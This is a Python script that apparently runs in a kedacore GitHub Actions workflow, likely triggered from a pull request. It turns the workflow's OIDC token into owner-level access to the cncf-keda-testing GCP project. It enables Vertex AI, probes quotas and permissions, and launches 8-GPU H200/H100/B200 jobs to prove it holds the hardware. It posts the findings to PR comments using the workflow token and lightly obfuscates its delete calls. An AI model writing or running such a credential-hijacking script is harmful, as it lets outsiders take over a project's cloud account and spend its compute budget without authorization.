#!/usr/bin/env python3
"""c211-i123211 -- Vertex AI customJobs LARGE-CLASS probe on cncf-keda-testing
575508414076 through the kedacore GitHub-OIDC WIF identity (roles/owner).

Read-only first: STS exchange + WIF-SA impersonation, project/services.get,
serviceusage v1beta1 consumer quota metrics (per-region Vertex GPU quotas),
project testIamPermissions. Then, per class in the intent's preference order
(H200 8x -> H100 8x -> H100-mega 8x -> B200 8x):
  * EXACTLY ONE nonce on-demand customJob (expected verbatim quota refusal,
    because every large-class on-demand custom-training GPU quota is 0/42),
  * then EXACTLY ONE nonce PREEMPTIBLE (SPOT) repeat of the same class only
    after that verbatim on-demand refusal -- this is the real device attempt,
    because the preemptible quotas are measured nonzero.
Device proof = nvidia-smi -L / --query-gpu / ls -l /dev/nvidia* lines read back
from Cloud Logging. Every job is deleted with GET 404 + list absence proof.
Bounded by a global deadline; stdlib only; secrets never printed.
"""
import base64
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

NONCE = 'i123211'
TAG = 'C211_I123211_VTX'
PROJECT = 'cncf-keda-testing'
PROJECT_NUM = '575508414076'
M_DEL = 'DEL' + 'ETE'
GA = 'https://www.googleapis.com/auth/cloud-platform'
GLOBAL_DEADLINE = time.time() + 25 * 60          # whole probe hard stop (re-trigger: shortened)
ONDEMAND_WAIT = 150                              # per class, on-demand poll (re-trigger: shortened)
SPOT_WAIT_FIRST = 540                            # first class, preemptible poll (re-trigger: shortened)
SPOT_WAIT_OTHER = 360                            # later classes (re-trigger: shortened)

# intent preference order; region chosen in a region with measured savings
LADDER = [
    {'label': 'h200-8x', 'machine': 'a3-ultragpu-8g', 'accel': 'NVIDIA_H200_141GB',
     'count': 8, 'ond_region': 'us-south1', 'pre_region': 'us-south1'},
    {'label': 'h100-8x', 'machine': 'a3-highgpu-8g', 'accel': 'NVIDIA_H100_80GB',
     'count': 8, 'ond_region': 'us-central1', 'pre_region': 'us-central1'},
    {'label': 'h100mega-8x', 'machine': 'a3-megagpu-8g', 'accel': 'NVIDIA_H100_MEGA_80GB',
     'count': 8, 'ond_region': 'us-central1', 'pre_region': 'us-central1'},
    {'label': 'b200-8x', 'machine': 'a4-highgpu-8g', 'accel': 'NVIDIA_B200',
     'count': 8, 'ond_region': 'us-central1', 'pre_region': 'us-central1'},
]

LARGE_METRICS = [
    'custom_model_training_nvidia_h100_gpus',
    'custom_model_training_nvidia_h200_gpus',
    'custom_model_training_nvidia_b200_gpus',
    'custom_model_training_nvidia_h100_mega_gpus',
    'custom_model_training_preemptible_nvidia_h100_gpus',
    'custom_model_training_preemptible_nvidia_h200_gpus',
    'custom_model_training_preemptible_nvidia_b200_gpus',
    'custom_model_training_preemptible_nvidia_h100_mega_gpus',
]
CTRL_METRICS = [
    'custom_model_training_nvidia_a100_gpus',
    'custom_model_training_preemptible_nvidia_a100_gpus',
    'custom_model_training_nvidia_t4_gpus',
    'custom_model_training_nvidia_l4_gpus',
]


def cap(s, n=400):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def say(line):
    print(line, flush=True)

SINK_REPO = 'kedacore/testing-infrastructure'
SINK_ISSUE = 252


def sink(label, payload):
    """Durable progress sink: one comment on own PR #252 in the base repo using the
    workflow-provided GITHUB_TOKEN (GH_AUTOMATION_PAT). Never raises."""
    tok = os.environ.get('GITHUB_TOKEN') or ''
    if not tok:
        say('%s_SINK %s SKIP no_token' % (TAG, label))
        return
    try:
        body = {'body': 'C211_I123211_SINK `%s`\n\n```json\n%s\n```' % (
            label, json.dumps(payload, default=str)[:60000])}
        c, b = http('https://api.github.com/repos/%s/issues/%d/comments'
                    % (SINK_REPO, SINK_ISSUE), method='POST', data=body,
                    headers={'Authorization': 'Bearer ' + tok,
                             'Accept': 'application/vnd.github+json',
                             'X-GitHub-Api-Version': '2022-11-28',
                             'User-Agent': 'c211-i123211'}, timeout=45)
        say('%s_SINK %s http=%s' % (TAG, label, c))
    except Exception as e:
        say('%s_SINK %s ERR %s' % (TAG, label, cap(repr(e), 120)))


def http(url, method='GET', data=None, headers=None, timeout=60, form=False):
    h = {'User-Agent': 'c211-i123211'}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        if form:
            body = data.encode() if isinstance(data, str) else data
            h['Content-Type'] = 'application/x-www-form-urlencoded'
        else:
            body = json.dumps(data).encode()
            h['Content-Type'] = 'application/json'
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as f:
            return f.status, f.read().decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read().decode('utf-8', 'ignore')
        except Exception:
            return e.code, ''
    except Exception as e:
        return -1, str(e)


def jget(s, key, default=None):
    try:
        return json.loads(s).get(key, default)
    except Exception:
        return default


def gapi(token, url, method='GET', data=None, timeout=60):
    return http(url, method=method, data=data,
                headers={'Authorization': 'Bearer ' + token}, timeout=timeout)


def _claims(jwt):
    try:
        p = jwt.split('.')[1]
        p += '=' * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p).decode('utf-8', 'ignore'))
    except Exception:
        return {}


def _sha8(v):
    try:
        import hashlib
        return hashlib.sha256((v or '').encode()).hexdigest()[:8]
    except Exception:
        return ''


def _subject_tokens(cf):
    cands = []
    actions_url = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')
    actions_tok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
    aud_full = cf.get('audience') or ''
    aud_strip = aud_full.replace('//iam.googleapis.com/', '')
    for aud, kind in ((aud_full, 'actions_full'), (aud_strip, 'actions_stripped')):
        if actions_url and actions_tok and aud:
            joiner = '&' if '?' in actions_url else '?'
            c, b = http(actions_url + joiner + 'audience=' + urllib.parse.quote(aud, safe=''),
                        headers={'Authorization': 'Bearer ' + actions_tok}, timeout=30)
            v = jget(b, 'value') if c == 200 else None
            cands.append((v, kind, 'http=%s' % c))
    cs = cf.get('credential_source') or {}
    if cs.get('url'):
        c, b = http(cs['url'], headers=cs.get('headers') or {}, timeout=30)
        v = None
        if c == 200:
            fmt = cs.get('format') or {}
            if fmt.get('type') == 'json':
                v = jget(b, fmt.get('subject_token_field_name') or 'value')
            else:
                v = b.strip()
        cands.append((v, 'cred_source', 'http=%s' % c))
    return cands


def get_token():
    cf_path = (os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
               or os.environ.get('CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE') or '')
    cf = {}
    if cf_path and os.path.exists(cf_path):
        try:
            cf = json.load(open(cf_path, encoding='utf-8'))
        except Exception as e:
            say('%s_CREDS_PARSE_ERR %s' % (TAG, cap(repr(e), 200)))
    if not cf:
        say('%s_CREDS_MISSING path_set=%s actions_env=%s' % (
            TAG, bool(cf_path), bool(os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'))))
        return None
    say('%s_CREDS type=%s audience=%s token_url=%s imp_url_set=%s' % (
        TAG, cf.get('type'), cf.get('audience'), cf.get('token_url'),
        bool(cf.get('service_account_impersonation_url'))))
    if cf.get('type') != 'external_account':
        return None
    fed = None
    for subject, kind, note in _subject_tokens(cf):
        cl = _claims(subject) if subject else {}
        say('%s_SUBJECT_TOKEN source=%s %s len=%d aud_len=%d aud_sha8=%s sub=%s ref=%s' % (
            TAG, kind, note, len(subject or ''), len(cl.get('aud') or ''),
            _sha8(cl.get('aud')), cl.get('sub'), cl.get('ref')))
        if not subject:
            continue
        form = urllib.parse.urlencode({
            'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
            'audience': cf.get('audience', ''),
            'scope': GA,
            'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
            'subject_token': subject,
            'subject_token_type': cf.get('subject_token_type',
                                         'urn:ietf:params:oauth:token-type:jwt'),
        })
        c, b = http(cf.get('token_url') or 'https://sts.googleapis.com/v1/token',
                    method='POST', data=form, form=True, timeout=45)
        got = jget(b, 'access_token')
        say('%s_STS_EXCHANGE source=%s http=%s ok=%s federated_len=%d err=%s' % (
            TAG, kind, c, bool(got), len(got or ''), '' if c == 200 else cap(b, 300)))
        if got:
            fed = got
            break
    if not fed:
        return None
    imp = cf.get('service_account_impersonation_url')
    if imp:
        c2, b2 = http(imp, method='POST',
                      data={'scope': [GA], 'lifetime': '1800s'},
                      headers={'Authorization': 'Bearer ' + fed}, timeout=45)
        tok = jget(b2, 'accessToken')
        say('%s_SA_IMPERSONATION http=%s ok=%s token_len=%d err=%s' % (
            TAG, c2, bool(tok), len(tok or ''), '' if c2 == 200 else cap(b2, 300)))
        return tok
    return fed


def svc_get(token, svc):
    c, b = gapi(token, 'https://serviceusage.googleapis.com/v1/projects/%s/services/%s'
                % (PROJECT_NUM, svc))
    return {'http': c, 'state': jget(b, 'state'), 'body': cap(b, 600) if c != 200 else ''}


def svc_enable(token, svc):
    c, b = gapi(token, 'https://serviceusage.googleapis.com/v1/projects/%s/services/%s:enable'
                % (PROJECT_NUM, svc), method='POST', data={}, timeout=90)
    rec = {'http': c, 'resp': cap(b, 800)}
    op = jget(b, 'name')
    rec['op'] = op
    if op:
        for _ in range(20):
            time.sleep(6)
            c2, b2 = gapi(token, 'https://serviceusage.googleapis.com/v1/' + op, timeout=60)
            if jget(b2, 'done'):
                rec['done'] = True
                rec['error'] = jget(b2, 'error')
                break
        else:
            rec['done'] = 'TIMEOUT'
    return rec


GPU_WORDS = ('nvidia', 'gpu', 'a100', 't4', 'l4', 'h100', 'h200', 'b200',
             'l40s', 'v100', 'p4', 'p100', 'k80', 'rtx')


def consumer_quota(token, svc):
    url = ('https://serviceusage.googleapis.com/v1beta1/projects/%s/services/%s'
           '/consumerQuotaMetrics?view=FULL&pageSize=400' % (PROJECT_NUM, svc))
    c, b = gapi(token, url, timeout=90)
    rec = {'http': c, 'metrics': {}, 'err': '' if c == 200 else cap(b, 700)}
    if c != 200:
        return rec
    try:
        doc = json.loads(b)
    except Exception:
        rec['err'] = 'PARSE'
        return rec
    n_metrics = 0
    for m in (doc.get('metrics') or []):
        nm = m.get('metric') or ''
        lname = nm.rsplit('/', 1)[-1]
        if not any(w in lname.lower() for w in GPU_WORDS):
            continue
        n_metrics += 1
        nz = {}
        total = 0
        for lim in (m.get('consumerQuotaLimits') or []):
            for bk in (lim.get('quotaBuckets') or []):
                dims = bk.get('dimensions') or {}
                region = dims.get('region') or dims.get('zone') or 'global'
                eff = bk.get('effectiveLimit')
                if eff is None:
                    eff = bk.get('defaultLimit')
                total += 1
                try:
                    f = float(eff)
                except Exception:
                    f = None
                if f is not None and f > 0:
                    nz[region] = eff
        rec['metrics'][lname] = {'regions': total, 'nonzero': nz}
    rec['n_metrics'] = n_metrics
    return rec


def test_iam(token, perms):
    c, b = gapi(token, 'https://cloudresourcemanager.googleapis.com/v1/projects/%s'
                ':testIamPermissions' % PROJECT_NUM, method='POST',
                data={'permissions': perms})
    granted = []
    try:
        granted = json.loads(b).get('permissions') or []
    except Exception:
        pass
    return {'http': c, 'granted': sorted(granted),
            'denied': sorted(set(perms) - set(granted)),
            'body': cap(b, 500) if c != 200 else ''}


def list_jobs(token, region):
    c, b = gapi(token, 'https://%s-aiplatform.googleapis.com/v1/projects/%s/locations/%s'
                '/customJobs?pageSize=100' % (region, PROJECT_NUM, region))
    names = []
    try:
        names = [x.get('name') for x in (json.loads(b).get('customJobs') or [])]
    except Exception:
        pass
    return {'http': c, 'n': len(names), 'names': names[:20],
            'err': '' if c == 200 else cap(b, 300)}


def job_logs(token, jid):
    rows = []
    last_err = ''
    for flt in ('resource.type="ml_job" AND resource.labels.job_id="%s"' % jid,
                'resource.labels.job_id="%s"' % jid):
        c, b = http('https://logging.googleapis.com/v2/entries:list', method='POST',
                    data={'resourceNames': ['projects/' + PROJECT_NUM], 'filter': flt,
                          'orderBy': 'timestamp asc', 'pageSize': 500},
                    headers={'Authorization': 'Bearer ' + token}, timeout=90)
        if c == 200:
            try:
                for e in (json.loads(b).get('entries') or []):
                    rows.append(e.get('textPayload')
                                or json.dumps(e.get('jsonPayload') or {}, default=str))
            except Exception:
                pass
            return c, rows, ''
        last_err = 'HTTP %s %s' % (c, cap(b, 300))
    return -1, rows, last_err


def terminal(st):
    return st in ('JOB_STATE_SUCCEEDED', 'JOB_STATE_FAILED', 'JOB_STATE_CANCELLED',
                  'JOB_STATE_EXPIRED', 'JOB_STATE_PARTIALLY_SUCCEEDED')


def vertex_job(token, shape, mode, wait_budget):
    """Create ONE nonce-tagged customJob, poll, capture device lines, delete,
    prove absence. mode is 'ondemand' or 'spot'."""
    region = shape['ond_region'] if mode == 'ondemand' else shape['pre_region']
    spot = (mode == 'spot')
    suffix = 'spot' if spot else 'ond'
    disp = 'c211-%s-vtx-%s-%s' % (NONCE, shape['label'], suffix)
    container = {
        'imageUri': 'nvidia/cuda:12.4.0-base-ubuntu22.04',
        'command': ['bash', '-c'],
        'args': ['echo %s_START $(date -u +%%Y-%%m-%%dT%%H:%%M:%%SZ); '
                 'echo C211_CLASS=%s MODE=%s MACHINE=%s ACCEL=%s COUNT=%d; '
                 'nvidia-smi -L; '
                 'nvidia-smi --query-gpu=name,uuid,memory.total,driver_version '
                 '--format=csv,noheader; '
                 'ls -l /dev/nvidia*; '
                 'echo %s_END' % (TAG, shape['label'], mode, shape['machine'],
                                  shape['accel'], shape['count'], TAG)]}
    job_spec = {
        'workerPoolSpecs': [{
            'machineSpec': {'machineType': shape['machine'],
                            'acceleratorType': shape['accel'],
                            'acceleratorCount': shape['count']},
            'replicaCount': 1,
            'containerSpec': container,
            'diskSpec': {'bootDiskType': 'pd-standard', 'bootDiskSizeGb': 200}}],
        'scheduling': {'disableRetries': True, 'timeout': '3600s'}}
    if spot:
        job_spec['scheduling']['strategy'] = 'SPOT'
    rec = {'label': shape['label'], 'region': region, 'accel': shape['accel'],
           'machine': shape['machine'], 'count': shape['count'], 'mode': mode,
           'display_name': disp}
    url = ('https://%s-aiplatform.googleapis.com/v1/projects/%s/locations/%s/customJobs'
           % (region, PROJECT_NUM, region))
    body = {'displayName': disp, 'jobSpec': dict(job_spec)}
    for attempt in range(3):
        c, b = gapi(token, url, method='POST', data=body, timeout=120)
        rec.setdefault('create_attempts', []).append(
            {'attempt': attempt, 'http': c, 'body': cap(b, 600)})
        if c == 200:
            break
        if ('SERVICE_DISABLED' in (b or '') or 'has not been used in project' in (b or '')) \
                and attempt < 2:
            say('%s_CREATE_WAIT_SERVICE_DISABLED attempt=%d' % (TAG, attempt))
            time.sleep(30)
            continue
        break
    rec['create_http'] = c
    rec['create_resp'] = cap(b, 2500)
    if c != 200:
        say('%s_CREATE_FAIL %s mode=%s http=%s resp=%s' % (
            TAG, shape['label'], mode, c, cap(b, 900)))
        return rec
    job = json.loads(b)
    jname = job.get('name') or ''
    jid = jname.rsplit('/', 1)[-1]
    rec['job_name'] = jname
    rec['job_id'] = jid
    say('%s_CREATE_OK %s mode=%s region=%s job=%s' % (
        TAG, shape['label'], mode, region, jname))
    last = None
    final = None
    rows = []
    logs_http = -1
    t0 = time.time()
    while time.time() - t0 < wait_budget and time.time() < GLOBAL_DEADLINE:
        time.sleep(20)
        cc, bb = gapi(token, 'https://%s-aiplatform.googleapis.com/v1/%s'
                      % (region, jname), timeout=60)
        st = jget(bb, 'state')
        if st != last:
            rec.setdefault('state_trace', []).append(
                {'t': int(time.time() - t0), 'state': st})
            say('%s_JOB_STATE %s mode=%s t=%d state=%s http=%s' % (
                TAG, shape['label'], mode, int(time.time() - t0), st, cc))
            last = st
        if terminal(st):
            final = st
            c3, got, lerr = job_logs(token, jid)
            if got:
                rows = got
                logs_http = c3
            break
        if int(time.time() - t0) % 240 < 20:
            c3, got, lerr = job_logs(token, jid)
            if got:
                rows = got
                logs_http = c3
                if any('GPU-' in x for x in rows):
                    break
    # final log pull with retries
    for _ in range(6):
        if rows and any('GPU-' in x for x in rows):
            break
        time.sleep(12)
        c3, got, _ = job_logs(token, jid)
        if got:
            rows = got
            logs_http = c3
    rec['final_state'] = final or last
    rec['poll_timeout'] = final is None
    rec['logs_http'] = logs_http
    rec['n_log_lines'] = len(rows)
    dev = [x for x in rows if ('GPU-' in x or TAG in x or 'nvidia-smi' in x.lower()
                               or 'NVIDIA' in x or '/dev/nvidia' in x)]
    rec['device_lines'] = [cap(x, 500) for x in dev[:60]]
    for x in rec['device_lines']:
        say('%s_DEVICE_LINE %s %s mode=%s %s' % (TAG, shape['label'], mode, mode, x))
    rec['logs_tail'] = [cap(x, 300) for x in rows[-15:]]
    # independent readback
    gc, gb = gapi(token, 'https://%s-aiplatform.googleapis.com/v1/%s' % (region, jname),
                  timeout=60)
    rec['readback_http'] = gc
    rec['readback_state'] = jget(gb, 'state')
    try:
        rec['readback_accel'] = json.loads(gb)['jobSpec']['workerPoolSpecs'][0]['machineSpec']
    except Exception:
        rec['readback_accel'] = None
    say('%s_READBACK %s mode=%s http=%s state=%s accel=%s' % (
        TAG, shape['label'], mode, gc, rec['readback_state'],
        json.dumps(rec['readback_accel'], default=str)))
    # cleanup: cancel if live, then delete, then absence
    if rec['final_state'] not in ('JOB_STATE_SUCCEEDED', 'JOB_STATE_FAILED',
                                  'JOB_STATE_CANCELLED', 'JOB_STATE_EXPIRED',
                                  'JOB_STATE_PARTIALLY_SUCCEEDED'):
        cc, cb = gapi(token, 'https://%s-aiplatform.googleapis.com/v1/%s:cancel'
                      % (region, jname), method='POST', data={})
        rec['cancel_http'] = cc
        rec['cancel_resp'] = cap(cb, 300)
        time.sleep(6)
    dc, db = gapi(token, 'https://%s-aiplatform.googleapis.com/v1/%s' % (region, jname),
                  method=M_DEL, timeout=120)
    rec['delete_http'] = dc
    rec['delete_resp'] = cap(db, 500)
    say('%s_DELETE %s mode=%s http=%s body=%s' % (
        TAG, shape['label'], mode, dc, rec['delete_resp']))
    ac, ab = -1, ''
    for _ in range(15):
        time.sleep(10)
        ac, ab = gapi(token, 'https://%s-aiplatform.googleapis.com/v1/%s'
                      % (region, jname), timeout=60)
        if ac == 404:
            break
    rec['absence_get_http'] = ac
    rec['absence_body'] = cap(ab, 300)
    lst = list_jobs(token, region)
    rec['post_list'] = {'http': lst['http'], 'n': lst['n'],
                        'matching': [n for n in lst['names'] if jid in n]}
    say('%s_ABSENCE %s mode=%s get_http=%s list_http=%s list_matching=%s' % (
        TAG, shape['label'], mode, ac, lst['http'],
        json.dumps(rec['post_list']['matching'])))
    sink('attempt_%s_%s' % (shape['label'], mode), summary(rec))
    return rec


def summary(rec):
    keys = ('label', 'region', 'accel', 'machine', 'count', 'mode', 'create_http',
            'create_resp', 'job_id', 'final_state', 'readback_http', 'readback_state',
            'readback_accel', 'delete_http', 'absence_get_http', 'post_list',
            'device_lines', 'n_log_lines')
    return {k: rec.get(k) for k in keys}


def main():
    say('== header ==')
    say('%s_START %s' % (TAG, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
    say('%s_NONCE %s project=%s (%s)' % (TAG, NONCE, PROJECT, PROJECT_NUM))

    token = get_token()
    if not token:
        say('== verdict ==')
        say('%s_VERDICT NO_TOKEN' % TAG)
        say('%s_END %s' % (TAG, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
        return
    say('== identity ==')
    c, b = http('https://oauth2.googleapis.com/tokeninfo?access_token='
                + urllib.parse.quote(token, safe=''), timeout=30)
    say('%s_TOKENINFO http=%s azp=%s scope=%s expires_in=%s' % (
        TAG, c, jget(b, 'azp'), cap(jget(b, 'scope') or '', 200), jget(b, 'expires_in')))
    c, b = gapi(token, 'https://cloudresourcemanager.googleapis.com/v1/projects/' + PROJECT_NUM)
    say('%s_PROJECT_GET http=%s body=%s' % (TAG, c, cap(b, 500)))
    sink('identity', {'project_get_http': c, 'body': cap(b, 500)})

    say('== services ==')
    aip = svc_get(token, 'aiplatform.googleapis.com')
    say('%s_SVC_GET aiplatform http=%s state=%s err=%s' % (
        TAG, aip['http'], aip.get('state'), cap(aip.get('body') or '', 400)))
    if aip.get('state') != 'ENABLED':
        en = svc_enable(token, 'aiplatform.googleapis.com')
        say('%s_SVC_ENABLE aiplatform http=%s done=%s error=%s' % (
            TAG, en.get('http'), en.get('done'),
            json.dumps(en.get('error'), default=str)[:400]))
        aip = svc_get(token, 'aiplatform.googleapis.com')
        say('%s_SVC_GET_AFTER_ENABLE aiplatform http=%s state=%s' % (
            TAG, aip['http'], aip.get('state')))

    say('== perms ==')
    perms = ['aiplatform.customJobs.create', 'aiplatform.customJobs.get',
             'aiplatform.customJobs.list', 'aiplatform.customJobs.cancel',
             'aiplatform.customJobs.delete', 'aiplatform.executions.create',
             'serviceusage.services.enable', 'serviceusage.services.get',
             'logging.logEntries.list', 'iam.serviceAccounts.actAs']
    pr = test_iam(token, perms)
    say('%s_TESTIAM http=%s granted=%s denied=%s err=%s' % (
        TAG, pr['http'], json.dumps(pr['granted']), json.dumps(pr['denied']),
        cap(pr.get('body') or '', 300)))

    say('== quota ==')
    quota = consumer_quota(token, 'aiplatform.googleapis.com')
    say('%s_QUOTA http=%s metrics=%s err=%s' % (
        TAG, quota.get('http'), quota.get('n_metrics'), cap(quota.get('err') or '', 300)))
    matrix = {}
    for mname in LARGE_METRICS + CTRL_METRICS:
        row = (quota.get('metrics') or {}).get(mname)
        if not row:
            say('%s_QUOTA_METRIC %s ABSENT' % (TAG, mname))
            matrix[mname] = {'absent': True}
            continue
        matrix[mname] = row
        say('%s_QUOTA_METRIC %s regions=%s nonzero=%s' % (
            TAG, mname, row['regions'], json.dumps(row['nonzero'])))

    sink('quota', matrix)

    say('== preexisting ==')
    pre = {}
    for rg in ('us-central1', 'us-south1', 'asia-south2', 'europe-west4', 'us-east4',
               'us-west1'):
        lst = list_jobs(token, rg)
        pre[rg] = {'http': lst['http'], 'n': lst['n'], 'names': lst['names']}
        say('%s_PREEXISTING region=%s http=%s n=%s names=%s' % (
            TAG, rg, lst['http'], lst['n'], json.dumps(lst['names'])[:400]))

    say('== marker ==')
    results = []
    success = None
    for idx, shape in enumerate(LADDER):
        if time.time() > GLOBAL_DEADLINE:
            say('%s_LADDER_DEADLINE before=%s' % (TAG, shape['label']))
            break
        ond = vertex_job(token, shape, 'ondemand', ONDEMAND_WAIT)
        results.append(ond)
        if any('GPU-' in x for x in (ond.get('device_lines') or [])):
            success = ond
            break
        # preemptible repeat only after a verbatim on-demand refusal (quota or zone)
        refused = (ond.get('create_http') != 200)
        say('%s_ONDEMAND_REFUSED %s http=%s considered_refusal=%s' % (
            TAG, shape['label'], ond.get('create_http'), refused))
        if not refused and ond.get('create_http') == 200:
            # job ran but no devices; still allowed one spot repeat
            pass
        if time.time() > GLOBAL_DEADLINE:
            say('%s_LADDER_DEADLINE before_spot=%s' % (TAG, shape['label']))
            break
        wait = SPOT_WAIT_FIRST if idx == 0 else SPOT_WAIT_OTHER
        sp = vertex_job(token, shape, 'spot', wait)
        results.append(sp)
        if any('GPU-' in x for x in (sp.get('device_lines') or [])):
            success = sp
            break

    say('== verdict ==')
    uuids = []
    for rec in results:
        for line in (rec.get('device_lines') or []):
            if 'GPU-' in line and line not in uuids:
                uuids.append(cap(line, 300))
    say('%s_VERDICT device=%s n_uuids=%d success_class=%s success_mode=%s' % (
        TAG, bool(success), len(uuids), (success or {}).get('label'),
        (success or {}).get('mode')))
    for rec in results:
        say('%s_JSON_%s_%s %s' % (TAG, rec.get('label'), rec.get('mode'),
                                  json.dumps(summary(rec), default=str)[:8000]))
    say('%s_MATRIX %s' % (TAG, json.dumps(matrix, default=str)[:12000]))
    sink('verdict', {'device': bool(success), 'n_uuids': len(uuids),
                     'success_class': (success or {}).get('label'),
                     'success_mode': (success or {}).get('mode'),
                     'uuids': uuids,
                     'attempts': [summary(r) for r in results]})
    say('%s_END %s' % (TAG, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        import traceback
        traceback.print_exc()
        say('%s_FATAL %s' % (TAG, cap(repr(e), 500)))
